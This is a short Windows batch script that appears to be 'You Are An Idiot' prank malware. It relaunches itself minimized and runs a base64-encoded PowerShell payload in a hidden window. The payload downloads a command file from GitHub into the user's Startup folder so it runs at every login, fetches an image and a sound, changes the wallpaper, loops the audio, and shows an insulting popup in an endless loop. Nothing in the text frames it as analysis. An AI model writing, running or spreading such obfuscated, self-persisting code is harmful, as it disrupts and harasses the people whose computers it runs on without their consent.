@echo off
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /C "%~dpnx0"
goto :EOF
:minimized
powershell -W hidden -enc ZgB1AG4AYwB0AGkAbwBuACAAbQBlAHMAcwBhAGcAZQAoACQAdgBhAGwAdQBlACkACgAgAHsACgAgACQAdwBzAGMAcgBpAHAAdAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAApADsACgAgACQAdwBzAGMAcgBpAHAAdAAuAFAAbwBwAHUAcAAoACIAJAB2AGEAbAB1AGUAIgAsADAALAAiAHcAaQBuAGQAbwB3AHMAIgAsADEANgApACAAfAAgAG8AdQB0AC0AbgB1AGwAbAAKACAAfQAKAAoAIABmAHUAbgBjAHQAaQBvAG4AIABzAGUAdAB3AGEAbABsAHAAYQBwAGUAcgAoACQAVgBhAGwAdQBlACkACgAgAHsACgAgACAAIAAgACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACIASABLAEMAVQA6AFwAQwBvAG4AdAByAG8AbAAgAFAAYQBuAGUAbABcAEQAZQBzAGsAdABvAHAAXAAiACAALQBuAGEAbQBlACAAVwBhAGwAbABQAGEAcABlAHIAIAAtAHYAYQBsAHUAZQAgACQAdgBhAGwAdQBlAAoAIAAgACAAIAAgAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAdQBzAGUAcgAzADIALgBkAGwAbAAsACAAVQBwAGQAYQB0AGUAUABlAHIAVQBzAGUAcgBTAHkAcwB0AGUAbQBQAGEAcgBhAG0AZQB0AGUAcgBzAAoAIAB9AAoACgAgAGYAdQBuAGMAdABpAG8AbgAgAG0AYQBpAG4AKAApAAoAIAB7AAoAIAAkAHQAZQBzAHQAeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAgAD0AIABUAGUAcwB0AC0AUABhAHQAaAAgAC0AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXAB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AYwBtAGQAIgAKACAAaQBmACgAJAB0AGUAcwB0AHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQAIAAtAGUAcQAgACQAZgBhAGwAcwBlACkACgAgACAAewAKACAAIAB3AGcAZQB0ACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBwAHMAeQBhAGIAdQAvAHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQALwBtAGEAaQBuAC8AaQBuAGkAdAAuAGMAbQBkACAALQBvACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAdQBzAGUAcgBuAGEAbQBlAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AHUAcABcAHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQALgBjAG0AZAAiAAoAIAAgAH0ACgAgACQAdABlAHMAdAB3AGEAdgAgAD0AIABUAGUAcwB0AC0AUABhAHQAaAAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AHQAZQBtAHAALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AdwBhAHYAIgAKACAAIABpAGYAKAAkAHQAZQBzAHQAdwBhAHYAIAAtAGUAcQAgACQAZgBhAGwAcwBlACkACgAgACAAewAKACAAIAB3AGcAZQB0ACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBwAHMAeQBhAGIAdQAvAHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQALwBtAGEAaQBuAC8AeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAuAHcAYQB2ACAALQBvACAAIgAkAGUAbgB2ADoAdABlAG0AcAAvAHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQALgB3AGEAdgAiAAoAIAAgAH0ACgAgACQAdABlAHMAdAB3AGEAbABsAHAAYQBwAGUAcgAgAD0AIABUAGUAcwB0AC0AUABhAHQAaAAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AHQAZQBtAHAALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AagBwAGcAIgAKACAAaQBmACgAJAB0AGUAcwB0AHcAYQBsAGwAcABhAHAAZQByACAALQBlAHEAIAAkAGYAYQBsAHMAZQApAAoAIAB7AAoAIAAgAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBpAC4AaQBtAGcAdQByAC4AYwBvAG0ALwBRAGoAYgA2AEoAegBPAC4AagBwAGcAIgAgAC0AbwAgACIAJABlAG4AdgA6AHQAZQBtAHAALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AagBwAGcAIgAKACAAfQAKACAAJABzAG8AdQBuAGQAUABsAGEAeQBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBlAGQAaQBhAC4AUwBvAHUAbgBkAFAAbABhAHkAZQByAAoAIAAkAHMAbwB1AG4AZABQAGwAYQB5AGUAcgAuAFMAbwB1AG4AZABMAG8AYwBhAHQAaQBvAG4APQAiACQAZQBuAHYAOgB0AGUAbQBwAFwAeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAuAHcAYQB2ACIACgAgACQAcwBvAHUAbgBkAFAAbABhAHkAZQByAC4AUABsAGEAeQBMAG8AbwBwAGkAbgBnACgAKQAKACAAcwBlAHQAdwBhAGwAbABwAGEAcABlAHIAIAAtAHYAYQBsAHUAZQAgACIAJABlAG4AdgA6AHQAZQBtAHAALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AagBwAGcAIgAKACAAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIAB1AHMAZQByADMAMgAuAGQAbABsACwAIABVAHAAZABhAHQAZQBQAGUAcgBVAHMAZQByAFMAeQBzAHQAZQBtAFAAYQByAGEAbQBlAHQAZQByAHMACgAgAHcAaABpAGwAZQAoACQAdAByAHUAZQApAAoAIAAgAHsACgAgACAAbQBlAHMAcwBhAGcAZQAgAC0AdgBhAGwAdQBlACAAIgAgAFkAbwB1ACAAQQByAGUAIABBAG4AIABJAGQAaQBvAHQAIAAuACIACgAgACAAfQAKAAoAIAB9AAoAbQBhAGkAbgA=
